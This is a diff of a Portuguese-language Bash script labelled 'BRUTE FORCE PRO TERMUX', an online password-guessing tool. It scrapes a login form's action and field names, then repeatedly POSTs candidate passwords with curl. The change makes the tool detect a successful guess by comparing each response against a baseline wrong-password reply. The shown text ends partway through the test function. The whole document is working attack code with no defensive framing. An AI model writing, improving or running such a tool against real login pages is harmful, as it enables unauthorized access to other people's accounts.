@@ -1,7 +1,7 @@
 #!/bin/bash
 
 clear
-echo -e "\e[1;32m==== BRUTE FORCE PRO TERMUX [DETECÇÃO AUTOMÁTICA + REDIRECIONAMENTO] ====\e[0m"
+echo -e "\e[1;32m==== BRUTE FORCE PRO TERMINUX [100% AUTOMÁTICO] ====\e[0m"
 
 read -p "🔗 URL da página de login (não o action): " page_url
 [ -z "$page_url" ] && echo -e "\e[1;31m❌ URL obrigatória.\e[0m" && exit 1
@@ -12,7 +12,6 @@ html=$(curl -s "$page_url")
 # Detectar action do formulário
 action=$(echo "$html" | grep -oP '(?<=<form[^>]*action=["'"'"']).*?(?=["'"'"'])' | head -n1)
 if [[ "$action" != http* ]]; then
-  # Caso action seja relativo
   action="${page_url%/}/$action"
 fi
 echo -e "📤 Form Action detectado: \e[1;33m$action\e[0m"
@@ -27,19 +26,18 @@ echo -e "🖋️ Campo de senha detectado: \e[1;33m$passfield\e[0m"
 read -p "👤 Usuário: " user
 [ -z "$user" ] && echo -e "\e[1;31m❌ Usuário obrigatório.\e[0m" && exit 1
 
-read -p "🔑 Senha personalizada (pressione ENTER para usar lista): " senha
+# Captura a resposta base para senha ERRADA
+echo -e "\e[1;34m▶️ Capturando resposta padrão de senha ERRADA...\e[0m"
+resposta_errada=$(curl -s -X POST "$action" -d "$userfield=$user&$passfield=senha_incorreta_teste")
 
-# Função para testar senha — detectando redirecionamento
+read -p "🔑 Senha personalizada (ENTER para lista): " senha
+
 testar_senha() {
   local pwd=$1
+  resp=$(curl -s -X POST "$action" -d "$userfield=$user&$passfield=$pwd")
 
-  # Captura o código HTTP e URL final após seguir redirects
-  result=$(curl -s -L -w "%{url_effective} %{http_code}" -o /dev/null -X POST "$action" -d "$userfield=$user&$passfield=$pwd")
-  final_url=$(echo "$result" | awk '{print $1}')
-  status_code=$(echo "$result" | awk '{print $2}')
-
-  if [[ "$final_url" != "$page_url" && "$status_code" =~ ^2|3 ]]; then
-    echo -e "\e[1;32m✅ SENHA ENCONTRADA: $pwd → REDIRECIONADO PARA: $final_url\e[0m"
+  if [[ "$resp" != "$resposta_errada" ]]; then
+    echo -e "\e[1;32m✅ SENHA ENCONTRADA: $pwd\e[0m"
     kill 0 2>/dev/null
     exit 0
   else
